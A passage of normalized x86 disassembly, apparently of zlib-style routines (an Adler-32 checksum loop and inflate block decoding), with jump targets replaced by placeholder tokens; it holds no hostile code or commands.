add [ esp + 0x10 ] edx
mov ecx [ esp + 0x4 ]
xor eax eax
mov al [ ecx + 0xc ]
add [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
add [ esp + 0x10 ] edx
mov ecx [ esp + 0x4 ]
xor eax eax
mov al [ ecx + 0xd ]
add [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
add [ esp + 0x10 ] edx
mov ecx [ esp + 0x4 ]
xor eax eax
mov al [ ecx + 0xe ]
add [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
add [ esp + 0x10 ] edx
mov ecx [ esp + 0x4 ]
xor eax eax
mov al [ ecx + 0xf ]
add [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
add [ esp + 0x10 ] edx
add [ esp + 0x4 ] 0x10
sub [ esp + 0x14 ] 0x10
cmp [ esp + 0x14 ] 0x10
jge r-xdata
mov [ esp + 0x14 ] edx
mov eax [ esp + 0x14 ]
sub [ esp + 0x8 ] eax
cmp [ esp + 0x14 ] 0x10
jl r-xdata
mov ecx 0xfff1
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov [ esp + 0xc ] edx
mov ecx 0xfff1
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov [ esp + 0x10 ] edx
cmp [ esp + 0x8 ] 0x0
ja r-xdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov al [ ecx ]
add [ esp + 0xc ] eax
inc [ esp + 0x4 ]
mov edx [ esp + 0xc ]
add [ esp + 0x10 ] edx
dec [ esp + 0x14 ]
jne r-xdata
sub_468778
push ebx
add esp 0xfffffff4
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov edx [ esp ]
cmp [ edx ] 0x4
je r-xdata
mov edx [ esp + 0x8 ]
mov ecx [ esp ]
mov eax [ ecx + 0x38 ]
mov [ edx ] eax
mov eax [ esp ]
mov ecx [ esp + 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ecx + 0x28 ]
mov ecx [ esp + 0x4 ]
call [ ecx + 0x24 ]
mov ecx [ esp ]
cmp [ ecx ] 0x5
jne r-xdata
mov edx [ esp ]
xor ecx ecx
mov [ edx ] ecx
xor edx edx
mov eax [ esp ]
mov [ eax + 0x1c ] edx
xor eax eax
mov ecx [ esp ]
mov [ ecx + 0x20 ] eax
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x24 ]
mov [ eax + 0x30 ] ecx
mov edx [ esp ]
mov [ edx + 0x2c ] ecx
mov eax [ esp ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov edx [ esp + 0x4 ]
mov eax [ esp ]
mov eax [ eax + 0xc ]
call sub_46a974
mov edx [ esp + 0x4 ]
mov ecx [ esp ]
mov eax [ ecx + 0x8 ]
call sub_4654d4
mov edx [ esp + 0x4 ]
mov ecx [ esp ]
mov eax [ ecx + 0x4 ]
call sub_4654d4
mov edx [ esp ]
cmp [ edx ] 0x6
jne r-xdata
add esp 0xc
pop ebx
retn
mov ebx [ esp ]
xor ecx ecx
xor edx edx
xor eax eax
call [ ebx + 0x34 ]
mov edx [ esp ]
mov [ edx + 0x38 ] eax
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x30 ] eax
sub_468848
push ebx
add esp 0xfffffff0
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov edx 0x1
mov eax [ esp ]
mov ebx [ esp ]
mov ecx 0x3c
mov eax [ eax + 0x28 ]
call [ ebx + 0x20 ]
mov [ esp + 0xc ] eax
test eax eax
jne r-xdata
mov eax [ esp ]
mov ebx [ esp ]
mov ecx [ esp + 0x8 ]
mov edx 0x1
mov eax [ eax + 0x28 ]
call [ ebx + 0x20 ]
mov edx [ esp + 0xc ]
test eax eax
mov [ edx + 0x24 ] eax
jne r-xdata
mov eax [ esp + 0xc ]
jmp r-xdata
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
mov ecx [ edx + 0x24 ]
add ecx [ esp + 0x8 ]
mov [ eax + 0x28 ] ecx
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x4 ]
mov [ ecx + 0x34 ] edx
xor edx edx
mov eax [ esp + 0xc ]
mov [ eax ] edx
mov ecx [ esp + 0xc ]
mov eax [ esp + 0xc ]
add ecx 0x38
mov edx [ esp ]
call sub_468778
mov eax [ esp + 0xc ]
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ esp + 0xc ]
mov eax [ eax + 0x28 ]
call [ ecx + 0x24 ]
xor eax eax
jmp r-xdata
add esp 0x10
pop ebx
retn
sub_4688f0
push ebx
add esp 0xffffffa4
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp + 0x4 ]
mov edx [ eax ]
mov [ esp + 0x18 ] edx
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x4 ]
mov [ esp + 0x1c ] eax
mov edx [ esp ]
mov ecx [ edx + 0x20 ]
mov [ esp + 0x10 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x1c ]
mov [ esp + 0x14 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x30 ]
mov [ esp + 0x20 ] eax
mov edx [ esp + 0x20 ]
mov ecx [ esp ]
cmp edx [ ecx + 0x2c ]
jae r-xdata
mov ecx [ esp ]
mov edx [ ecx + 0x28 ]
sub edx [ esp + 0x20 ]
mov eax [ esp ]
mov edx [ eax + 0x2c ]
sub edx [ esp + 0x20 ]
dec edx
jmp r-xdata
mov [ esp + 0x8 ] 0xfffffffe
mov ecx [ esp + 0x10 ]
mov eax [ esp ]
mov [ eax + 0x20 ] ecx
mov edx [ esp + 0x14 ]
mov ecx [ esp ]
mov [ ecx + 0x1c ] edx
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x4 ]
sub ecx [ eax ]
mov edx [ esp + 0x4 ]
add [ edx + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
mov edx [ esp + 0x20 ]
mov ecx [ esp ]
mov [ ecx + 0x30 ] edx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp [ ecx * 4 + jump_table_46896e ]
mov [ esp + 0x24 ] edx
cmp [ esp + 0x14 ] 0x3
jae r-xdata
cmp [ esp + 0x14 ] 0x20
jae r-xdata
cmp [ esp + 0x1c ] 0x0
jne r-xdata
cmp [ esp + 0x14 ] 0xe
jae r-xdata
mov eax [ esp ]
mov ecx [ eax + 0x4 ]
mov eax [ esp ]
shr ecx 0xa
add ecx 0x4
cmp ecx [ eax + 0x8 ]
ja r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x4 ]
mov [ esp + 0xc ] ecx
mov edx [ esp + 0xc ]
mov eax [ esp + 0xc ]
shr edx 0x5
and eax 0x1f
and edx 0x1f
mov ecx [ esp ]
add eax edx
add eax 0x102
cmp eax [ ecx + 0x8 ]
ja r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp ]
mov [ edx + 0x20 ] eax
mov ecx [ esp + 0x14 ]
mov eax [ esp ]
mov [ eax + 0x1c ] ecx
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x4 ] edx
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x4 ]
sub eax [ edx ]
mov ecx [ esp + 0x4 ]
add [ ecx + 0x8 ] eax
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x4 ]
mov [ edx ] eax
mov ecx [ esp + 0x20 ]
mov eax [ esp ]
mov [ eax + 0x30 ] ecx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_469c9c
mov [ esp + 0x8 ] eax
dec eax
je r-xdata
mov eax [ esp + 0x20 ]
mov edx [ esp ]
mov [ edx + 0x30 ] eax
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
mov [ esp + 0x8 ] eax
mov ecx [ esp ]
mov eax [ ecx + 0x30 ]
mov [ esp + 0x20 ] eax
mov edx [ esp + 0x20 ]
mov ecx [ esp ]
cmp edx [ ecx + 0x2c ]
jae r-xdata
mov [ esp + 0x8 ] 0x1
mov eax [ esp + 0x10 ]
mov edx [ esp ]
mov [ edx + 0x20 ] eax
mov ecx [ esp + 0x14 ]
mov eax [ esp ]
mov [ eax + 0x1c ] ecx
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x4 ] edx
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x4 ]
sub eax [ edx ]
mov ecx [ esp + 0x4 ]
add [ ecx + 0x8 ] eax
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x4 ]
mov [ edx ] eax
mov ecx [ esp + 0x20 ]
mov eax [ esp ]
mov [ eax + 0x30 ] ecx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
mov [ esp + 0x8 ] 0xfffffffd
mov edx [ esp + 0x10 ]
mov ecx [ esp ]
mov [ ecx + 0x20 ] edx
mov eax [ esp + 0x14 ]
mov edx [ esp ]
mov [ edx + 0x1c ] eax
mov ecx [ esp + 0x1c ]
mov eax [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x4 ]
sub edx [ ecx ]
mov eax [ esp + 0x4 ]
add [ eax + 0x8 ] edx
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x4 ]
mov [ ecx ] edx
mov eax [ esp + 0x20 ]
mov edx [ esp ]
mov [ edx + 0x30 ] eax
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
mov edx [ esp + 0x10 ]
and edx 0x7
mov [ esp + 0xc ] edx
mov eax [ esp ]
mov ecx [ esp + 0xc ]
and ecx 0x1
mov [ eax + 0x18 ] ecx
mov edx [ esp + 0xc ]
shr edx 0x1
sub edx 0x1
jb r-xdata
cmp [ esp + 0x1c ] 0x0
je r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
not ecx
shr ecx 0x10
and edx 0xffff
and ecx 0xffff
cmp edx ecx
je r-xdata
cmp [ esp + 0x1c ] 0x0
je r-xdata
cmp [ esp + 0x24 ] 0x0
jne r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp ]
mov [ edx + 0x20 ] eax
mov ecx [ esp + 0x14 ]
mov eax [ esp ]
mov [ eax + 0x1c ] ecx
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x4 ] edx
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x4 ]
sub eax [ edx ]
mov ecx [ esp + 0x4 ]
add [ ecx + 0x8 ] eax
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x4 ]
mov [ edx ] eax
mov ecx [ esp + 0x20 ]
mov eax [ esp ]
mov [ eax + 0x30 ] ecx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
mov edx [ esp + 0x10 ]
and edx 0x3fff
mov [ esp + 0xc ] edx
mov eax [ esp ]
mov [ eax + 0x4 ] edx
mov ecx [ esp + 0xc ]
and ecx 0x1f
cmp ecx 0x1d
ja r-xdata
cmp [ esp + 0x1c ] 0x0
je r-xdata
cmp [ esp + 0x14 ] 0x3
jae r-xdata
jmp r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
mov [ esp + 0xc ] ecx
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0xc ]
jae r-xdata
mov edx [ esp + 0x4 ]
mov eax [ esp ]
mov eax [ eax + 0x14 ]
call sub_4654d4
mov edx [ esp ]
xor ecx ecx
mov [ edx + 0x14 ] ecx
mov [ esp + 0x48 ] 0x9
mov [ esp + 0x4c ] 0x6
mov eax [ esp ]
lea ecx [ esp + 0x48 ]
mov edx [ eax + 0x4 ]
mov [ esp + 0xc ] edx
push ecx
lea eax [ esp + 0x50 ]
push eax
lea edx [ esp + 0x58 ]
push edx
lea ecx [ esp + 0x60 ]
push ecx
mov eax [ esp + 0x14 ]
push eax
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x14 ]
shr edx 0x5
mov eax [ esp + 0x20 ]
and edx 0x1f
and eax 0x1f
inc edx
add eax 0x101
mov ecx [ ecx + 0xc ]
call sub_4651dc
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov edx [ esp + 0x4 ]
mov eax [ esp ]
mov eax [ eax + 0xc ]
call sub_46a974
mov edx [ esp + 0x4 ]
mov ecx [ esp ]
mov eax [ ecx + 0x8 ]
call sub_4654d4
mov edx [ esp + 0x4 ]
mov ecx [ esp ]
mov eax [ ecx + 0x4 ]
call sub_4654d4
mov edx [ esp + 0x4 ]
mov ecx [ edx ]
mov [ esp + 0x18 ] ecx
mov eax [ esp + 0x4 ]
mov edx [ eax + 0x4 ]
mov [ esp + 0x1c ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x20 ]
mov [ esp + 0x10 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x1c ]
mov [ esp + 0x14 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x30 ]
mov [ esp + 0x20 ] edx
mov ecx [ esp + 0x20 ]
mov eax [ esp ]
cmp ecx [ eax + 0x2c ]
jae r-xdata
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
mov ecx [ esp ]
mov edx [ ecx + 0x28 ]
sub edx [ esp + 0x20 ]
mov eax [ esp ]
mov edx [ eax + 0x2c ]
sub edx [ esp + 0x20 ]
dec edx
jmp r-xdata
add esp 0x5c
pop ebx
retn
shr [ esp + 0x10 ] 0x3
sub [ esp + 0x14 ] 0x3
mov ecx [ esp + 0x14 ]
and ecx 0x7
mov [ esp + 0xc ] ecx
mov ecx [ esp + 0xc ]
shr [ esp + 0x10 ] cl
mov eax [ esp + 0xc ]
sub [ esp + 0x14 ] eax
mov edx [ esp ]
mov [ edx ] 0x1
jmp r-xdata
je r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esp ]
mov [ ecx + 0x20 ] edx
mov eax [ esp + 0x14 ]
mov edx [ esp ]
mov [ edx + 0x1c ] eax
mov ecx [ esp + 0x1c ]
mov eax [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x4 ]
sub edx [ ecx ]
mov eax [ esp + 0x4 ]
add [ eax + 0x8 ] edx
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x4 ]
mov [ ecx ] edx
mov eax [ esp + 0x20 ]
mov edx [ esp ]
mov [ edx + 0x30 ] eax
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
jmp r-xdata
mov edx [ esp ]
mov eax [ esp + 0x10 ]
and eax 0xffff
xor ecx ecx
mov [ edx + 0x4 ] eax
mov [ esp + 0x14 ] ecx
mov [ esp + 0x10 ] ecx
mov eax [ esp ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
mov [ eax ] 0x9
mov edx [ esp + 0x4 ]
mov [ edx + 0x18 ] rw-data
mov [ esp + 0x8 ] 0xfffffffd
mov ecx [ esp + 0x10 ]
mov eax [ esp ]
mov [ eax + 0x20 ] ecx
mov edx [ esp + 0x14 ]
mov ecx [ esp ]
mov [ ecx + 0x1c ] edx
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x4 ]
sub ecx [ eax ]
mov edx [ esp + 0x4 ]
add [ edx + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
mov edx [ esp + 0x20 ]
mov ecx [ esp ]
mov [ ecx + 0x30 ] edx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esp ]
mov [ ecx + 0x20 ] edx
mov eax [ esp + 0x14 ]
mov edx [ esp ]
mov [ edx + 0x1c ] eax
mov ecx [ esp + 0x1c ]
mov eax [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x4 ]
sub edx [ ecx ]
mov eax [ esp + 0x4 ]
add [ eax + 0x8 ] edx
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x4 ]
mov [ ecx ] edx
mov eax [ esp + 0x20 ]
mov edx [ esp ]
mov [ edx + 0x30 ] eax
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x4 ]
mov [ esp + 0xc ] ecx
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x1c ]
jbe r-xdata
mov edx [ esp + 0x20 ]
mov ecx [ esp ]
cmp edx [ ecx + 0x28 ]
jne r-xdata
mov edx [ esp ]
mov [ edx ] 0x9
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x18 ] rw-data
mov [ esp + 0x8 ] 0xfffffffd
mov eax [ esp + 0x10 ]
mov edx [ esp ]
mov [ edx + 0x20 ] eax
mov ecx [ esp + 0x14 ]
mov eax [ esp ]
mov [ eax + 0x1c ] ecx
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x4 ] edx
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x4 ]
sub eax [ edx ]
mov ecx [ esp + 0x4 ]
add [ ecx + 0x8 ] eax
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x4 ]
mov [ edx ] eax
mov ecx [ esp + 0x20 ]
mov eax [ esp ]
mov [ eax + 0x30 ] ecx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
mov eax [ esp + 0xc ]
shr eax 0x5
and eax 0x1f
cmp eax 0x1d
jbe r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp ]
mov [ eax + 0x20 ] ecx
mov edx [ esp + 0x14 ]
mov ecx [ esp ]
mov [ ecx + 0x1c ] edx
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x4 ]
sub ecx [ eax ]
mov edx [ esp + 0x4 ]
add [ edx + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
mov edx [ esp + 0x20 ]
mov ecx [ esp ]
mov [ ecx + 0x30 ] edx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x8 ]
inc [ edx + 0x8 ]
mov eax [ ecx * 4 + rw-data ]
mov edx [ esp ]
mov ecx [ edx + 0xc ]
mov edx [ esp + 0x10 ]
and edx 0x7
mov [ ecx + eax * 4 ] edx
shr [ esp + 0x10 ] 0x3
sub [ esp + 0x14 ] 0x3
cmp [ esp + 0x1c ] 0x0
je r-xdata
mov eax [ esp ]
cmp [ eax + 0x8 ] 0x13
jb r-xdata
mov ecx [ esp + 0xc ]
mov edx [ esp ]
mov eax [ ecx * 4 + rw-data ]
and eax [ esp + 0x10 ]
shl eax 0x3
add eax [ edx + 0x14 ]
mov [ esp + 0x38 ] eax
xor eax eax
mov ecx [ esp + 0x38 ]
mov al [ ecx + 0x1 ]
mov [ esp + 0xc ] eax
mov edx [ esp + 0x38 ]
mov ecx [ edx + 0x4 ]
mov [ esp + 0x44 ] ecx
cmp [ esp + 0x44 ] 0x10
jae r-xdata
cmp [ esp + 0x1c ] 0x0
je r-xdata
mov edx [ esp + 0x54 ]
push edx
mov ecx [ esp + 0x8 ]
push ecx
mov ecx [ esp + 0x58 ]
mov edx [ esp + 0x54 ]
mov eax [ esp + 0x50 ]
call sub_469c38
mov [ esp + 0x58 ] eax
test eax eax
jne r-xdata
cmp [ esp + 0xc ] 0xfffffffd
jne r-xdata
mov eax [ esp ]
mov ecx [ eax + 0x28 ]
sub ecx [ esp + 0x20 ]
mov edx [ esp ]
mov ecx [ edx + 0x2c ]
sub ecx [ esp + 0x20 ]
dec ecx
jmp r-xdata
mov ecx [ esp ]
mov [ ecx ] 0x8
mov edx [ esp + 0x10 ]
mov ecx [ esp ]
mov [ ecx + 0x20 ] edx
mov eax [ esp + 0x14 ]
mov edx [ esp ]
mov [ edx + 0x1c ] eax
mov ecx [ esp + 0x1c ]
mov eax [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x4 ]
sub edx [ ecx ]
mov eax [ esp + 0x4 ]
add [ eax + 0x8 ] edx
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x4 ]
mov [ ecx ] edx
mov eax [ esp + 0x20 ]
mov edx [ esp ]
mov [ edx + 0x30 ] eax
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
mov eax [ esp ]
mov ecx [ eax + 0x2c ]
mov eax [ esp ]
cmp ecx [ eax + 0x30 ]
je r-xdata
mov eax [ esp ]
mov ecx [ eax ]
cmp ecx 0x9
ja r-xdata
lea eax [ esp + 0x34 ]
push eax
lea ecx [ esp + 0x34 ]
lea edx [ esp + 0x30 ]
lea eax [ esp + 0x2c ]
call sub_46530c
mov edx [ esp + 0x34 ]
push edx
mov ecx [ esp + 0x8 ]
push ecx
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x30 ]
call sub_469c38
mov edx [ esp ]
mov [ edx + 0xc ] eax
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
dec edx
je r-xdata
mov ecx [ esp + 0x14 ]
dec [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
mov dl [ eax ]
xor eax eax
mov al dl
shl eax cl
or [ esp + 0x10 ] eax
inc [ esp + 0x18 ]
add [ esp + 0x14 ] 0x8
cmp [ esp + 0x14 ] 0x3
jb r-xdata
mov edx 0x7
mov eax [ esp ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov edx 0x2
jmp r-xdata
mov ecx [ esp + 0x14 ]
dec [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
mov dl [ eax ]
xor eax eax
mov al dl
shl eax cl
or [ esp + 0x10 ] eax
inc [ esp + 0x18 ]
add [ esp + 0x14 ] 0x8
cmp [ esp + 0x14 ] 0x20
jb r-xdata
mov ecx [ esp + 0xc ]
cmp ecx [ esp + 0x24 ]
jbe r-xdata
mov edx [ esp + 0x1c ]
mov [ esp + 0xc ] edx
cmp [ esp + 0x24 ] 0x0
jne r-xdata
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x2c ]
cmp edx [ ecx + 0x24 ]
je r-xdata
mov ecx [ esp + 0xc ]
mov edx [ esp + 0xc ]
shr ecx 0x5
and edx 0x1f
and ecx 0x1f
add edx ecx
add edx 0x102
mov [ esp + 0xc ] edx
cmp [ esp + 0xc ] 0x13
jae r-xdata
mov ecx [ esp + 0x14 ]
dec [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
mov dl [ eax ]
xor eax eax
mov al dl
shl eax cl
or [ esp + 0x10 ] eax
inc [ esp + 0x18 ]
add [ esp + 0x14 ] 0x8
cmp [ esp + 0x14 ] 0xe
jb r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esp ]
mov [ ecx + 0x20 ] edx
mov eax [ esp + 0x14 ]
mov edx [ esp ]
mov [ edx + 0x1c ] eax
mov ecx [ esp + 0x1c ]
mov eax [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x4 ]
sub edx [ ecx ]
mov eax [ esp + 0x4 ]
add [ eax + 0x8 ] edx
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x4 ]
mov [ ecx ] edx
mov eax [ esp + 0x20 ]
mov edx [ esp ]
mov [ edx + 0x30 ] eax
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
jmp r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x8 ]
inc [ edx + 0x8 ]
mov eax [ ecx * 4 + rw-data ]
mov edx [ esp ]
mov ecx [ edx + 0xc ]
xor edx edx
mov [ ecx + eax * 4 ] edx
mov ecx [ esp ]
mov [ ecx + 0x10 ] 0x7
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x4 ]
add ecx 0x14
mov edx [ esp + 0x4 ]
add edx 0x10
mov eax [ eax + 0xc ]
call sub_465168
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
cmp [ esp + 0x44 ] 0x12
jne r-xdata
mov ecx [ esp + 0xc ]
shr [ esp + 0x10 ] cl
mov eax [ esp + 0xc ]
sub [ esp + 0x14 ] eax
mov edx [ esp ]
mov eax [ edx + 0x8 ]
inc [ edx + 0x8 ]
mov edx [ esp ]
mov ecx [ edx + 0xc ]
mov edx [ esp + 0x44 ]
mov [ ecx + eax * 4 ] edx
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp ]
mov [ eax + 0x20 ] ecx
mov edx [ esp + 0x14 ]
mov ecx [ esp ]
mov [ ecx + 0x1c ] edx
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x4 ]
sub ecx [ eax ]
mov edx [ esp + 0x4 ]
add [ edx + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x4 ]
mov [ eax ] ecx
mov edx [ esp + 0x20 ]
mov ecx [ esp ]
mov [ ecx + 0x30 ] edx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov ecx [ esp ]
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0xc ]
mov ecx [ esp + 0x4 ]
mov eax [ eax + 0x28 ]
call [ ecx + 0x24 ]
mov edx [ esp + 0x58 ]
mov eax [ esp ]
mov [ eax + 0xc ] edx
mov edx [ esp + 0x50 ]
mov ecx [ esp ]
mov [ ecx + 0x4 ] edx
mov eax [ esp + 0x54 ]
mov edx [ esp ]
mov [ edx + 0x8 ] eax
mov ecx [ esp ]
mov [ ecx ] 0x6
mov edx [ esp + 0x4 ]
mov eax [ esp + 0x54 ]
call sub_4654d4
mov edx [ esp + 0x4 ]
mov eax [ esp + 0x50 ]
call sub_4654d4
mov [ esp + 0x8 ] 0xfffffffc
mov edx [ esp + 0x10 ]
mov ecx [ esp ]
mov [ ecx + 0x20 ] edx
mov eax [ esp + 0x14 ]
mov edx [ esp ]
mov [ edx + 0x1c ] eax
mov ecx [ esp + 0x1c ]
mov eax [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x4 ]
sub edx [ ecx ]
mov eax [ esp + 0x4 ]
add [ eax + 0x8 ] edx
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x4 ]
mov [ ecx ] edx
mov eax [ esp + 0x20 ]
mov edx [ esp ]
mov [ edx + 0x30 ] eax
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
mov edx [ esp + 0xc ]
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x10 ]
mov edx [ esp ]
mov [ edx + 0x20 ] eax
mov ecx [ esp + 0x14 ]
mov eax [ esp ]
mov [ eax + 0x1c ] ecx
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x4 ] edx
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x4 ]
sub eax [ edx ]
mov ecx [ esp + 0x4 ]
add [ ecx + 0x8 ] eax
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x4 ]
mov [ edx ] eax
mov ecx [ esp + 0x20 ]
mov eax [ esp ]
mov [ eax + 0x30 ] ecx
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_46a994
jmp r-xdata
mov eax [ esp ]
mov [ eax ] 0x9
cmp [ esp + 0x14 ] 0x7
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov [ esp + 0x24 ] ecx
mov edx [ esp ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax + 0x4 ] edx
mov ecx [ esp ]
xor eax eax
mov [ ecx + 0x8 ] eax
shr [ esp + 0x10 ] 0x3
sub [ esp + 0x14 ] 0x3
mov edx [ esp ]
mov [ edx ] 0x6
